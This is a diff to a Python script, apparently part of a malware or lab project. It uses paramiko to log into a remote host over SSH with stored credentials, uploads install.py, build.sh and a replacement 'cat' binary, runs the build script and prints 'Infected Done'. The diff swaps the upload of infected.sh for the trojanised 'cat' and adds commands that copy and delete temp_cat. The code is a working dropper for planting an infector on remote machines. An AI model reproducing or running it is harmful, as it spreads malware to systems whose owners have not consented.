@@ -34,17 +34,24 @@ def main():
     s.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     s.connect(sys.argv[1], 22, username=ssh.username,  password=ssh.passwd)
 
+    stdin, stdout, stderr = s.exec_command("cp cat temp_cat")
+    print(stdout.read().decode())
+
+    stdin, stdout, stderr = s.exec_command("rm temp_cat")
+    print(stdout.read().decode())
+
     sftp = s.open_sftp()
     sftp.put('./install.py', 'install.py')
     sftp.put('./build.sh', 'build.sh')
-    sftp.put('./infected.sh', 'infected.sh')
-    sftp.put('./temp_cat', 'temp_cat')
+    sftp.put('./cat', 'cat')
 
     stdin, stdout, stderr = s.exec_command("chmod +x build.sh")
     print(stdout.read().decode())
 
     stdin, stdout, stderr = s.exec_command("./build.sh")
     print(stdout.read().decode())
+
+    print("Infected Done")
 
     sftp.close()
 
